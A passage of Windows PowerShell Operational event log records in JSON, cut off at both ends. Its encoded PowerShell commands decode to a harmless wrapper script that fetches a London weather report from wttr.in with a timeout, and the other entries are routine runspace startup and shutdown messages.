CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closed"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closing"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opened"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 53504,
      "details": "Windows PowerShell has started an IPC listening thread on process: 6100 in AppDomain: DefaultAppDomain."
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAfQAKAH0ACgAkAHIAZQBzAHUAbAB0ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0AQwBvAG0AcAByAGUAcwBzAAoA"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 40961,
      "details": "PowerShell console is starting up"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Opening"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8195,
      "details": "Opening RunspacePool"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8194,
      "details": "Creating RunspacePool object \r\n \t InstanceId 408c2020-2848-4b72-977f-15745e5ca77e \r\n \t MinRunspaces 1 \r\n \t MaxRunspaces 1"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8193,
      "details": "Creating Runspace object \r\n \t Instance Id: b6e4ce0e-5cb8-413c-a289-36f9dea8ae5a"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIABoAHQAdABwADoALwAvAHcAdAB0AHIALgBpAG4ALwBMAG8AbgBkAG8AbgAKACcAQAAKACQAdABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAPQAgADIANQAKACQAcgBlAHMAdQBsAHQAIAA9ACAAQAB7AAoAIAAgACAAIABTAHQAZABvAHUAdAAgAD0AIAAiACIACgAgACAAIAAgAFMAdABkAGUAcgByACAAPQAgACIAIgAKACAAIAAgACAAUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAtADEACgB9AAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAHMAYwByAGkAcAB0AEIAbABvAGMAawAgAD0AIABbAHMAYwByAGkAcAB0AGIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAYwBvAG0AbQBhAG4AZABUAG8AUgB1AG4AKQAKACAAIAAgACAAJABqAG8AYgAgAD0AIABTAHQAYQByAHQALQBKAG8AYgAgAC0AUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsACgAgACAAIAAgAGkAZgAgACgAVwBhAGkAdAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAFQAaQBtAGUAbwB1AHQAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwApACAAewAKACAAIAAgACAAIAAgACAAIAAkAG8AdQB0AHAAdQB0ACAAPQAgAFIAZQBjAGUAaQB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABvAHUAdAAgAD0AIAAoACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwApAC4AVAByAGkAbQAoACkACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGoAbwBiAC4AUwB0AGEAdABlACAALQBlAHEAIAAnAEYAYQBpAGwAZQBkACcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAJABqAG8AYgAuAEMAaABpAGwAZABKAG8AYgBzAFsAMABdAC4ASgBvAGIAUwB0AGEAdABlAEkAbgBmAG8ALgBSAGUAYQBzAG8AbgAuAE0AZQBzAHMAYQBnAGUACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAIAAgACAAIAAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAEMAbwBtAG0AYQBuAGQAIAB0AGkAbQBlAGQAIABvAHUAdAAgAG8AbgAgAHQAaABlACAAcwBlAHIAdgBlAHIAIABhAGYAdABlAHIAIAAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAHMAZQBjAG8AbgBkAHMALgAiAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEAMgA0AAoAIAAgACAAIAB9AAoAfQAgAGMAYQB0AGMAaAAgAHsACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBTAHQAZABlAHIAcgAgAD0AIAAiAFcAcgBhAHAAcABlAHIAIABTAGMAcgBpAHAAdAAgAEUAcgByAG8AcgA6ACAAJAAoACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuAC4ATQBlAHMAcwBhAGcAZQApACIACgAgACAAIAAgACQAcgBlAHMAdQBsAHQALgBSAGUAdAB1AHIAbgBDAG8AZABlACAAPQAgADEACgB9ACAAZgBpAG4AYQBsAGwAeQAgAHsACgAgACAAIAAgAGkAZgAgACgAJABqAG8AYgApACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAbwBwAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAKACAAIAAgACAAIAAgACAAIABSAGUAbQBvAHYAZQAtAEoAbwBiACAALQBKAG8AYgAgAC